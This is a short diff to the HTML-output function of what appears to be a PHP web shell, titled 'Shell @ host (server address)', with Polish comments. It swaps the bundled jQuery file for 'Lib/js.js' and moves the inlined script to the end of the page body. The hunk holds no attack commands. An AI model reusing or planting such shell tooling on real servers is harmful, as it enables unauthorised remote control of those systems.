@@ -1365,7 +1365,7 @@ DATA;
 			return $aMatch[1];
 		}
 
-		$sScript = file_get_contents( 'Lib/jQuery.js' );
+		$sScript = file_get_contents( 'Lib/js.js' );
 
 		/**
 		 * Wylaczenie JavaScript
@@ -1379,12 +1379,12 @@ DATA;
 		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
 		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
 		$sVersion = self::VERSION;
-return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style>{$sScript}</head><body>
+return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style></head><body>
 <div id=\"body\">" .
 ( $bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : NULL ) .
 "<div id=\"content\">{$sData}</div></div>" .
 ( $bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL ) .
-"</div></body></html>";
+"</div>{$sScript}</body></html>";
 	}
 
 	/**
